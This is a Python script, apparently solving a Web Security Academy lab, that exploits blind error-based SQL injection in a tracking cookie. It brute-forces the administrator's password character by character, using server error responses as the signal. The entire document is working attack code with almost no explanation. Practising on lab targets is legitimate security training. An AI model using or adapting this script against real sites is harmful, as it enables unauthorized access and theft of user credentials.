import requests

password = ""
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
url = "https://0a95002503da94b4805803f5007600f7.web-security-academy.net/filter?category=Accessories"

def sql_injection():
    global password
    while len(password) < 20:
        for char in alphabet:
            payload = (
                f"TrackingId=tfPEi4822ldibs7h' || (SELECT CASE WHEN "
                f"(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username = 'administrator' "
                f"AND SUBSTR(password, {len(password)+1}, 1) ='{char}') || ';session=s3DD0gJqQAysl28BqBVsVmQbf3T6OGOi"
            )
            headers = {"Cookie": payload}
            req = requests.get(url=url, headers=headers)
            if req.status_code == 500:
                print(char)
                password += char
                break  # Move to the next character position once a match is found
        print(password)

sql_injection()
